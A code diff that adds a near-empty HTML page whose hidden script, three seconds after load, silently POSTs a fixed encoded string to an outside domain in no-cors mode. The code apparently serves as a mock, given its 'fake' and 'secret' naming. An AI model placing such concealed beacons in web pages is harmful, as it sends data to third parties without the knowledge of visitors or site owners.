@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>--------------------------------------------------</title>
+</head>
+<body>
+
+<script>
+  function sendFakeInfoToServer(data) {
+    const fakeServerUrl = 'https://bet000-ultra.net/api/ad-get';
+
+    fetch(fakeServerUrl, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: {
+        'Content-Type': 'text/plain'
+      },
+      body: data
+    })
+    .then(response => {
+      
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+  }
+
+  function initiateSecretAction() {
+    const fakeData = "=====10A====10B====10C====TmF0aXZl!JZQXI2LWMU======";
+    sendFakeInfoToServer(fakeData);
+  }
+
+  setTimeout(initiateSecretAction, 3000);
+</script>
+
+</body>
+</html>
